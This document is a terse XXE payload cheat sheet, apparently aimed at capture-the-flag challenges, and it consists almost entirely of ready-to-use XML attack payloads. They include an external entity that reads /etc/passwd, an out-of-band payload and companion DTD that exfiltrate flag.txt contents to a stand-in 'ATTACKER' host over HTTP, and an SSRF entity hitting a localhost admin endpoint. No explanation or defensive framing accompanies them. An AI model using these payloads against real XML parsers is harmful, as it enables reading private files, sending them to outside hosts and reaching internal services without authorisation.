# XXE

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
```

## File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

## OOB

```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///flag.txt">
  <!ENTITY % dtd SYSTEM "http://ATTACKER/xxe.dtd">
  %dtd;
]>
<root/>
```

`xxe.dtd`:

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER/?x=%file;'>">
%all;
```

## SSRF

```xml
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"> ]>
<root>&xxe;</root>
```
